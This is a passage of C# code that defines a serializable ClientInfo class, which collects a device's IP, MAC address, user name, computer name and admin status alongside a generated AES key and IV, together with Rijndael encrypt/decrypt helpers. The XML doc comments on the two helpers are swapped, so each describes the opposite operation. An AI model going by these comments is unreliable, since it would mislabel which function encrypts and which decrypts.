            /// Contains important info of the current instance (device).
            /// </summary>
            [Serializable]
            public class ClientInfo : IEnumerable<object>
            {
                public string IP { get; set; }
                public string MACAddress { get; set; }
                public string UserName { get; set; }
                public string ComputerName { get; set; }
                public string UID { get; set; }
                public string Language { get; set; }
                public bool IsAdministrator { get; set; }
                public string OSName { get; set; }
                public double AppVersion { get; private set; }
                public string AppNetVersion { get; set; }
                public bool IsConnected { get; set; } = false;
                public byte[] Key { get; set; }
                public byte[] IV { get; set; }

                public BaseInfoType Type { get; set; }
                [NonSerialized]
                private Connector _connector;
                public Connector Connector { get { return _connector; } set { _connector = value; } }
                public ClientInfo()
                {
                    AppVersion = 1.0;
                    GenerateKeyAndIV();
                }
                public ClientInfo(string uid, BaseInfoType type)
                {
                    AppVersion = 1.0;
                    UID = uid;
                    Type = type;
                    GenerateKeyAndIV();
                }
                public ClientInfo(string uid)
                {
                    AppVersion = 1.0;
                    UID = uid;
                    Type = BaseInfoType.Client;
                    GenerateKeyAndIV();
                }
                public ClientInfo(BaseInfoType type)
                {
                    AppVersion = 1.0;
                    Type = type;
                    GenerateKeyAndIV();
                }
                private void GenerateKeyAndIV()
                {
                    AesManaged aes = new AesManaged();
                    aes.GenerateKey();
                    aes.GenerateIV();
                    Key = aes.Key;
                    IV = aes.IV;
                }
                private IEnumerable<object> Info()
                {
                    yield return IP;
                    yield return MACAddress;
                    yield return UserName;
                    yield return ComputerName;
                    yield return OSName;
                    yield return AppVersion;
                    yield return AppNetVersion;
                    yield return IsAdministrator;
                    yield return UID;
                    yield return Language;
                    yield return Type;
                }
                public IEnumerator<object> GetEnumerator()
                {
                    return Info().GetEnumerator();
                }
                IEnumerator IEnumerable.GetEnumerator()
                {
                    return GetEnumerator();
                }
            }
        }
        namespace Security
        {
            /// <summary>
            /// Contains the encryption and decryption functions.
            /// </summary>
            public class Encryption
            {
                /// <summary>
                /// Encrypts a given array of bytes using a key and a initialization vector.
                /// </summary>
                /// <param name="data">The array of bytes to encrypt.</param>
                /// <param name="key">The key.</param>
                /// <param name="iv">The initialization vector.</param>
                /// <returns>The encrypted byte array.</returns>
                public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
                {
                    MemoryStream ms = new MemoryStream();
                    Rijndael alg = Rijndael.Create();
                    alg.Key = key;
                    alg.IV = iv;
                    CryptoStream cs = new CryptoStream(ms,
                    alg.CreateDecryptor(), CryptoStreamMode.Write);
                    cs.Write(data, 0, data.Length);
                    cs.Close();
                    byte[] decryptedData = ms.ToArray();
                    return decryptedData;
                }
                /// <summary>
                /// Decrypts a given array of bytes using a key and a initialization vector,
                /// </summary>
                /// <param name="data">The array of bytes to decrypt.</param>
                /// <param name="key">The key.</param>
                /// <param name="iv">The initialization vector.</param>
                /// <returns>The decrypted byte array.</returns>
                public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
                {
                    MemoryStream ms = new MemoryStream();
                    Rijndael alg = Rijndael.Create();
                    alg.Key = key;
                    alg.IV = iv;
                    CryptoStream cs = new CryptoStream(ms,
                    alg.CreateEncryptor(), CryptoStreamMode.Write);
                    cs.Write(data, 0, data.Length);
                    cs.Close();
                    byte[] encryptedData = ms.ToArray();
                    return encryptedData;
                }
            }
        }
    }
}
